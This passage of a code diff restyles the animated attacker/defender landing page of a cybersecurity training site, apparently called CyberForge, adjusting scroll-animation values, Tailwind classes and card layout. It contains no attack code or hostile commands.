+    if (columns[2].length) zoomTimeline.to(columns[2], { xPercent: 40 }, '<');
     if (columns[1].length) {
       zoomTimeline.to(
         columns[1],
         {
-          yPercent: (index) => (index < Math.floor(columns[1].length / 2) ? -1 : 1) * 35,
+          yPercent: (index) => (index < Math.floor(columns[1].length / 2) ? -1 : 1) * 40,
           duration: 0.5,
           ease: 'power1.inOut'
         },
@@ -434,7 +510,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
       );
     }
 
-    // Toggle Content function
+    // 9. Content Toggle Callback (exact Codrops easing & timing)
     const toggleContent = (isVisible) => {
       if (!titleEl || !descEl || !buttonEl) return;
       gsap.timeline({ defaults: { overwrite: true } })
@@ -455,7 +531,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
         );
     };
 
-    // Master Grid Scroll Timeline
+    // 10. Master Grid Scroll Timeline (scrubbed from top 25% to bottom bottom)
     const masterTimeline = gsap.timeline({
       scrollTrigger: {
         trigger: blockEl,
@@ -475,7 +551,6 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
     return () => {
       lenis.destroy();
       gsap.ticker.remove(tickerCb);
-      particleTrigger.kill();
       parallaxTrigger.kill();
       titleTrigger.kill();
       masterTimeline.kill();
@@ -486,7 +561,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
   return (
     <div className="scroll-page selection:bg-white/20">
       {/* Sleek CyberForge HUD Bar */}
-      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-6 py-4 bg-black/40 backdrop-blur-md border-b border-white/10 pointer-events-auto">
+      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-6 py-4 bg-black/50 backdrop-blur-md border-b border-white/10 pointer-events-auto">
         <div className="flex items-center gap-3">
           <div className="w-8 h-8 rounded-lg bg-[#141724] border border-[#23283b] flex items-center justify-center">
             {isAttacker ? (
@@ -521,25 +596,25 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
         </div>
       </header>
 
-      {/* ---------------- BLOCK INTRO: Fullscreen Particle Canvas ---------------- */}
+      {/* ---------------- BLOCK INTRO: Fixed 3D Particle Canvas Viewport ---------------- */}
       <section ref={introRef} className="block--intro">
-        {/* Particle Canvas */}
+        {/* WebGL Particle Simulation (Hooded Mask / Shield Hood) */}
         {isAttacker ? (
-          <AttackerParticles boomProgress={boomProgress} />
+          <AttackerParticles />
         ) : (
-          <DefenderParticles boomProgress={boomProgress} />
+          <DefenderParticles />
         )}
 
         {/* Hero Scroll Cue */}
-        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 z-20 flex flex-col items-center gap-2 pointer-events-none opacity-80">
+        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 z-20 flex flex-col items-center gap-2 pointer-events-none opacity-85">
           <span className={`text-[11px] font-mono tracking-widest uppercase ${isAttacker ? 'text-red-300/80' : 'text-sky-300/80'}`}>
-            Scroll to Explode & Explore Mission Grid
+            Scroll to Explode & Reveal Mission Grid
           </span>
           <ChevronDown className={`w-5 h-5 animate-bounce ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`} />
         </div>
       </section>
 
-      {/* ---------------- BLOCK MAIN: Sticky Parallax & Zoom Grid ---------------- */}
+      {/* ---------------- BLOCK MAIN: 425vh Sticky Parallax & Zoom Grid ---------------- */}
       <section ref={mainBlockRef} className="block block--main">
         <div ref={wrapperRef} className="block__wrapper">
           {/* Centered Content Overlay (revealed upon scroll zoom) */}
@@ -564,45 +639,46 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
             <button
               ref={btnRef}
               onClick={() => alert(`Launching ${isAttacker ? 'Attacker Command Center' : 'Defender Console'}...`)}
-              className={`content__button inline-flex items-center gap-2 px-7 py-3 rounded-xl border shadow-lg ${
+              className={`content__button inline-flex items-center gap-2 px-8 py-3.5 rounded-xl border shadow-xl ${
                 isAttacker
-                  ? 'bg-red-950/40 hover:bg-red-900/60 border-red-500/50 text-red-200 shadow-red-500/20'
-                  : 'bg-sky-950/40 hover:bg-sky-900/60 border-[#2ab7ff]/50 text-[#dbf5ff] shadow-[#2ab7ff]/20'
+                  ? 'bg-red-950/60 hover:bg-red-900/80 border-red-500/50 text-red-200 shadow-red-500/25'
+                  : 'bg-sky-950/60 hover:bg-sky-900/80 border-[#2ab7ff]/50 text-[#dbf5ff] shadow-[#2ab7ff]/25'
               }`}
             >
               <span>{isAttacker ? 'Engage War Room →' : 'Activate SOC Console →'}</span>
             </button>
           </div>
 
-          {/* 3-Column Tactical Task Gallery Grid */}
+          {/* 3-Column Tactical Task Gallery Grid (12 Items) */}
           <div className="gallery">
             <div ref={gridRef} className="gallery__grid">
               {tasks.map((task) => (
                 <div key={task.id} className="gallery__item">
                   <div
-                    className={`cyber-card bg-[#0b0d15]/95 border ${
+                    onClick={() => setSelectedTask(task)}
+                    className={`cyber-card bg-[#0b0e17]/95 border backdrop-blur-md ${
                       isAttacker
-                        ? 'border-[#26141a] hover:border-red-500/60 hover:shadow-[0_0_24px_rgba(255,42,61,0.25)]'
-                        : 'border-[#152336] hover:border-[#2ab7ff]/60 hover:shadow-[0_0_24px_rgba(42,183,255,0.25)]'
+                        ? 'border-[#26141a] hover:border-red-500/80 hover:shadow-[0_0_24px_rgba(255,42,61,0.3)]'
+                        : 'border-[#152336] hover:border-[#2ab7ff]/80 hover:shadow-[0_0_24px_rgba(42,183,255,0.3)]'
                     }`}
                   >
                     <div>
-                      {/* Card Header with Icon & Badge */}
-                      <div className="flex items-center justify-between mb-2 sm:mb-3">
+                      {/* Card Header with SVG & Badge */}
+                      <div className="flex items-center justify-between mb-2">
                         <div
                           className={`p-2 rounded-xl ${
                             isAttacker
-                              ? 'bg-red-950/50 border border-red-500/30'
-                              : 'bg-sky-950/50 border border-[#2ab7ff]/30'
+                              ? 'bg-red-950/60 border border-red-500/30'
+                              : 'bg-sky-950/60 border border-[#2ab7ff]/30'
                           }`}
                         >
                           {task.svg}
                         </div>
                         <span
-                          className={`text-[9px] sm:text-[10px] font-mono px-2 py-0.5 rounded-full border ${
+                          className={`text-[9px] font-mono px-2 py-0.5 rounded-full border ${
                             isAttacker
-                              ? 'bg-red-950/40 text-red-300 border-red-500/30'
-                              : 'bg-sky-950/40 text-sky-300 border-[#2ab7ff]/30'
+                              ? 'bg-red-950/50 text-red-300 border-red-500/30'
+                              : 'bg-sky-950/50 text-sky-300 border-[#2ab7ff]/30'
                           }`}
                         >
                           {task.badge}
@@ -610,16 +686,16 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
                       </div>
 
                       {/* Card Title & Desc */}
-                      <h3 className="text-xs sm:text-sm md:text-base font-bold text-white mb-1 tracking-tight">
+                      <h3 className="text-xs sm:text-sm font-bold text-white mb-1 tracking-tight">
                         {task.title}
                       </h3>
-                      <p className="text-[10px] sm:text-xs text-zinc-400 line-clamp-2 sm:line-clamp-3 leading-relaxed">
+                      <p className="text-[10px] text-zinc-400 line-clamp-2 leading-relaxed">
                         {task.desc}
                       </p>
                     </div>
 
                     {/* "More ->" Link */}
-                    <div className="pt-2 border-t border-white/5 flex items-center justify-between">
+                    <div className="pt-2 border-t border-white/5 flex items-center justify-between mt-auto">
                       <button
                         type="button"
                         onClick={(e) => {
@@ -633,7 +709,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
                         <span>More</span>
                         <span className="transition-transform group-hover:translate-x-1">→</span>
                       </button>
-                      <span className="text-[10px] font-mono text-zinc-600">CyberForge</span>
+                      <span className="text-[9px] font-mono text-zinc-600">MISSION</span>
                     </div>
                   </div>
                 </div>
@@ -710,7 +786,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
 
             {/* Modal Footer */}
             <div className="mt-6 pt-4 border-t border-white/10 flex items-center justify-between">
-              <span className="text-[11px] font-mono text-zinc-500">CyberForge Operator Module</span>
+              <span className="text-[11px] font-mono text-zinc-500">CyberForge Module Briefing</span>
               <button
                 onClick={() => setSelectedTask(null)}
                 className={`px-5 py-2 rounded-xl text-xs font-semibold text-white transition-all ${
